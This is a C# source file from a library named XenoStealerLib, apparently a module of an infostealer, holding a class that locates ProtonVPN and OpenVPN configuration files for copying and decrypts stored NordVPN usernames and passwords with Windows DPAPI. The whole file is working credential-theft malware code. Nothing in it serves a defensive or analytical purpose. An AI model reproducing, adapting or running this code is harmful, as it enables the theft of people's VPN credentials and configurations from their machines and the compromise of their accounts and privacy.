using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Xml;

namespace XenoStealerLib
{
    public static class Vpns
    {

        private static string localAppdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        private static string roamingAppdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        private static string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

        private static string Decode(string s)
        {
            try
            {
                return Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(s), null, DataProtectionScope.LocalMachine));
            }
            catch
            {
                return "";
            }
        }


        public static string[] GetProtonVpnPaths()//returns paths of user configs, split by names in the filepath, youll figure it out
        {
            var vpn = Path.Combine(localAppdata, "ProtonVPN");
            if (!Directory.Exists(vpn))
                return new string[0];
            return Directory.GetFiles(vpn, "user.config", SearchOption.AllDirectories);
        }

        private static string[] GetOpenVpnConfigPath() 
        {
            List<string> paths = new List<string>();
            foreach (RegistryView view in new RegistryView[] { RegistryView.Registry64, RegistryView.Registry32 })
            {
                try
                {
                    using (RegistryKey LocalMachineX = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, view))
                    {
                        using (RegistryKey OpenedKey = LocalMachineX.OpenSubKey("SOFTWARE\\OpenVPN"))
                        {
                            object configobj = OpenedKey.GetValue("config_dir");
                            if (configobj != null) 
                            {
                                paths.Add(configobj.ToString());
                                break;
                            }
                        }
                    }
                }
                catch
                {

                }
            }
            string userPath = Path.Combine(userProfile, "OpenVPN", "config");
            if (Directory.Exists(userPath)) 
            { 
                paths.Add(userPath);
            }
            return paths.ToArray();
        }

        public static string[] OpenVpnPaths()//gets files that need to be copied
        {
            List<string> ovpnPaths = new List<string>();
            string[] ConfigPaths = GetOpenVpnConfigPath();
            foreach (string configPath in ConfigPaths) 
            {
                if (configPath == null || !Directory.Exists(configPath))
                    continue;
                try
                {
                    foreach (string file in Directory.GetFiles(configPath, "*.*", SearchOption.AllDirectories))
                    {
                        if (Path.GetExtension(file).Contains("ovpn"))
                        {
                            ovpnPaths.Add(file);
                        }
                    }
                }
                catch
                {
                }
            }

            return ovpnPaths.ToArray();

        }

        public static NordVpnInfo[] GetNordVpnInfo()
        {
            List<NordVpnInfo> nordVpnInfos = new List<NordVpnInfo>();

            var vpn = new DirectoryInfo(Path.Combine(localAppdata, "NordVPN"));
            if (!vpn.Exists)
                return nordVpnInfos.ToArray();
           
            try
            {
                foreach (var d in vpn.GetDirectories("NordVpn.exe*"))
                {
                    foreach (var v in d.GetDirectories())
                    {
                        var userConfigPath = Path.Combine(v.FullName, "user.config");
                        if (!File.Exists(userConfigPath)) continue;

                        XmlDocument doc = new XmlDocument();
                        doc.Load(userConfigPath);

                        string encodedUsername = doc.SelectSingleNode("//setting[@name='Username']/value")?.InnerText;
                        string encodedPassword = doc.SelectSingleNode("//setting[@name='Password']/value")?.InnerText;

                        if (encodedUsername == null || string.IsNullOrEmpty(encodedUsername) ||
                            encodedPassword == null || string.IsNullOrEmpty(encodedPassword)) continue;
                        string username = Decode(encodedUsername);
                        string password = Decode(encodedPassword);

                        nordVpnInfos.Add(new NordVpnInfo(username, password, v.FullName));
                    }
                }
            }
            catch 
            {
                
            }

            return nordVpnInfos.ToArray();
        }

        public class NordVpnInfo 
        {
            public string username;
            public string password;
            public string FullPath;

            public NordVpnInfo(string username, string password, string Path)
            {
                this.username = username;
                this.password = password;
                this.FullPath = Path;
            }
        }

    }
}
